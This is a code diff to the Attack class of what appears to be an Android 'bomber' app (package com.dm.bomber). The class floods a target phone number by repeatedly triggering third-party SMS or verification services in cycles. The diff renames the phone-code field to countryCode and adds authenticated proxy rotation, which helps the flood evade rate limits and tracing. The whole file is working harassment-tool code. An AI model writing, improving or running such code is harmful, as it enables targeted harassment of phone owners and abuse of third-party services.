@@ -7,7 +7,6 @@ import com.dm.bomber.services.Services;
 
 import org.jetbrains.annotations.NotNull;
 
-import java.net.Proxy;
 import java.util.List;
 import java.util.concurrent.CountDownLatch;
 
@@ -20,10 +19,10 @@ public class Attack extends Thread {
     private static final String TAG = "Attack";
 
     private final Callback callback;
-    private final String phoneCode;
+    private final String countryCode;
     private final String phone;
     private final int numberOfCycles;
-    private final List<Proxy> proxies;
+    private final List<AuthProxy> proxies;
 
     private int progress = 0;
 
@@ -41,11 +40,11 @@ public class Attack extends Thread {
                 return response;
             });
 
-    public Attack(Callback callback, String phoneCode, String phone, int cycles, List<Proxy> proxies) {
+    public Attack(Callback callback, String countryCode, String phone, int cycles, List<AuthProxy> proxies) {
         super(phone);
 
         this.callback = callback;
-        this.phoneCode = phoneCode;
+        this.countryCode = countryCode;
         this.phone = phone;
         this.proxies = proxies;
 
@@ -54,16 +53,19 @@ public class Attack extends Thread {
 
     @Override
     public void run() {
-        List<Service> usableServices = Services.getUsableServices(phoneCode.isEmpty() ? 0 : Integer.parseInt(phoneCode));
+        List<Service> usableServices = Services.getUsableServices(countryCode);
 
         callback.onAttackStart(usableServices.size(), numberOfCycles);
-        Log.i(TAG, String.format("Starting attack on +%s%s", phoneCode, phone));
+        Log.i(TAG, String.format("Starting attack on +%s%s", countryCode, phone));
 
         clientBuilder.proxy(null);
 
         for (int cycle = 0; cycle < numberOfCycles; cycle++) {
-            if (!proxies.isEmpty())
-                clientBuilder.proxy(proxies.get(cycle % proxies.size()));
+            if (!proxies.isEmpty()) {
+                AuthProxy authProxy = proxies.get(cycle % proxies.size());
+                clientBuilder.proxy(authProxy)
+                        .proxyAuthenticator(authProxy);
+            }
 
             OkHttpClient client = clientBuilder.build();
 
@@ -72,7 +74,7 @@ public class Attack extends Thread {
 
             for (Service service : usableServices) {
                 try {
-                    service.prepare(phoneCode, phone);
+                    service.prepare(countryCode, phone);
                     service.run(client, new com.dm.bomber.services.Callback() {
                         @Override
                         public void onError(Exception e) {
@@ -104,6 +106,6 @@ public class Attack extends Thread {
         }
 
         callback.onAttackEnd();
-        Log.i(TAG, String.format("Attack on +%s%s ended", phoneCode, phone));
+        Log.i(TAG, String.format("Attack on +%s%s ended", countryCode, phone));
     }
 }
